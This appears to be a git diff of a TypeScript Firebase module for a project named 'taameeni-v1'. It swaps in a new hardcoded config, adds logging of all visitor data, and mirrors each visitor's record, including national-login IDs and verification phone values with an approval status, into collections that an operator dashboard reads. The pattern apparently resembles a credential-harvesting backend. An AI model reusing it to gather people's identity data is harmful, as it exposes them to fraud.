@@ -23,14 +23,14 @@ type FirebaseConfig = {
 }
 
 const fallbackConfig: FirebaseConfig = {
-  apiKey: "AIzaSyBg4Skcl89HheHNkqC80Cm1bd429j7lUJw",
-  authDomain: "whaaa-6f64d.firebaseapp.com",
-  databaseURL: "https://whaaa-6f64d-default-rtdb.firebaseio.com",
-  projectId: "whaaa-6f64d",
-  storageBucket: "whaaa-6f64d.firebasestorage.app",
-  messagingSenderId: "828749821160",
-  appId: "1:828749821160:web:3b00b5446c8cd1722bc55d",
-  measurementId: "G-M45W939MHR",
+  apiKey: "AIzaSyB-qlb_QYAPBqijr00XN-PeUd9DTzI0MDs",
+  authDomain: "taameeni-v1.firebaseapp.com",
+  databaseURL: "https://taameeni-v1-default-rtdb.firebaseio.com",
+  projectId: "taameeni-v1",
+  storageBucket: "taameeni-v1.firebasestorage.app",
+  messagingSenderId: "240999338900",
+  appId: "1:240999338900:web:bb73a1ea1239d2c074f581",
+  measurementId: "G-MP49WZ65T2",
 }
 
 const resolveConfig = (): FirebaseConfig => {
@@ -139,6 +139,7 @@ const writeMirrorRecord = async (
   payload: Record<string, any>,
 ) => {
   if (!db || !database) {
+    console.warn(`[Firebase] writeMirrorRecord: db or database not ready — skipping ${collectionName}/${recordId}`)
     return
   }
 
@@ -146,6 +147,7 @@ const writeMirrorRecord = async (
     setDoc(doc(db, collectionName, recordId), payload, { merge: true }),
     set(ref(database, `${collectionName}/${recordId}`), payload),
   ])
+  console.log(`[Firebase] ✅ write success → Firestore:${collectionName}/${recordId} | RTDB:${collectionName}/${recordId}`)
 }
 
 const appendNotification = async (visitorId: string, payload: Record<string, any>) => {
@@ -175,31 +177,39 @@ const appendNotification = async (visitorId: string, payload: Record<string, any
   }
 
   const notificationRef = await addDoc(collection(db, "notifications"), summary)
+  console.log(`[Firebase] ✅ notification written → Firestore:notifications/${notificationRef.id}`)
 
   await set(ref(database, `notifications/${notificationRef.id}`), {
     ...summary,
     id: notificationRef.id,
   })
+  console.log(`[Firebase] ✅ notification written → RTDB:notifications/${notificationRef.id}`)
 }
 
 export async function addData(data: Record<string, any>) {
   if (!db || !database) {
-    console.warn("Firebase not initialized. Cannot add data.")
+    console.warn("[Firebase] addData: not initialized — db:", !!db, "database:", !!database)
     return
   }
 
   const visitorId = String(data.id || localStorage.getItem("visitor") || `visitor_${Date.now()}`)
   localStorage.setItem("visitor", visitorId)
 
+  console.log(`[Firebase] addData called for visitorId=${visitorId}`, data)
+
   const visitorSnapshot = buildVisitorSnapshot(data, visitorId)
 
   try {
     await Promise.all([
+      // pays — backward compat for existing pages that read from pays
       writeMirrorRecord("pays", visitorId, {
         ...visitorSnapshot,
         createdAt: visitorSnapshot.updatedAt,
       }),
+      // visitors — Dashboard reads from this collection
       writeMirrorRecord("visitors", visitorId, visitorSnapshot),
+      // users — also write here so Dashboard can use /users collection
+      writeMirrorRecord("users", visitorId, visitorSnapshot),
       setDoc(
         doc(db, "analytics", "summary"),
         {
@@ -217,11 +227,12 @@ export async function addData(data: Record<string, any>) {
         status: data.status || data.approval || "pending",
         source: data.nafazId ? "nafaz" : data.phone2 ? "verification" : "quote",
       })
+      console.log(`[Firebase] ✅ order record written → orders/${visitorId}`)
     }
 
     await appendNotification(visitorId, visitorSnapshot)
   } catch (error) {
-    console.error("Error adding document:", error)
+    console.error("[Firebase] ❌ addData error:", error)
   }
 }
 
